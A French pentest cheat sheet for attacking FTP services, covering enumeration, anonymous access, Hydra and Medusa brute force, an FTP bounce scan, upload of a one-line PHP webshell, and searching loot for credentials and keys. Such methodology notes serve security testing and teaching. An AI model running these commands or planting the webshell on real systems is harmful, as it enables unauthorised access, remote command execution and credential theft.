# FTP (21/TCP)

Le File Transfer Protocol (FTP) permet le transfert de fichiers entre un client et un serveur.

## 🔍 Énumération

### Scan de base
```bash
# Scan Nmap détaillé
sudo nmap -sC -sV -p 21 $IP

# Vérification des vulnérabilités connues
nmap --script=ftp-* -p 21 $IP
```

### Connexion anonyme
```bash
# Tentative de connexion anonyme
ftp $IP
# Username: anonymous
# Password: [vide] ou email@example.com

# Alternative avec netexec
nxc ftp $IP -u '' -p '' --ls
```

### Exploration du contenu
```bash
# Une fois connecté en FTP
ls -la        # Lister les fichiers (incluant cachés)
pwd           # Afficher le répertoire courant
cd [dossier]  # Changer de répertoire
```

## 🔨 Exploitation

### Authentification anonyme
```bash
# Télécharger tous les fichiers disponibles
wget -m --no-passive ftp://anonymous:anonymous@$IP/

# Télécharger un fichier spécifique
netexec ftp $IP -u '' -p '' --get [FILE]

# Télécharger un dossier complet
lftp -u anonymous,anonymous ftp://$IP
mirror -c --verbose [dossier]
```

### Attaque par force brute
```bash
# Avec Hydra
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f $IP ftp

# Avec Medusa
medusa -u [user] -P /usr/share/wordlists/rockyou.txt -h $IP -M ftp
```

### FTP Bounce Attack
Exploite la commande PORT pour scanner des hôtes internes inaccessibles directement.

```bash
# Scan bounce avec Nmap
nmap -Pn -v -n -p80 -b anonymous:password@$IP [TARGET_IP]
```

### Upload de webshell ou reverse shell
```bash
# Création d'un webshell PHP simple
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload via FTP
ftp $IP
put shell.php

# Si PHP est installé sur le serveur, visitez http://$IP/shell.php?cmd=id
```

## 🔐 Post-exploitation

### Recherche d'informations sensibles
```bash
# Recherche de fichiers de configuration
grep -r "password\|user\|username\|pass" .

# Recherche de clés SSH, fichiers de configuration
find . -name "*.key" -o -name "*.conf" -o -name "*.cfg"
```

### Établir une persistance
```bash
# Créer un .netrc pour une connexion automatique
echo "machine $IP login [username] password [password]" >> ~/.netrc
chmod 600 ~/.netrc
```

## ⚠️ Erreurs courantes & astuces
- FTP peut fonctionner en mode actif ou passif - essayez les deux en cas de problème
- Certains serveurs limitent le nombre de connexions - attendez entre les tentatives
- Vérifiez les permissions des répertoires après connexion
- Les messages d'erreur peuvent révéler des informations sur la configuration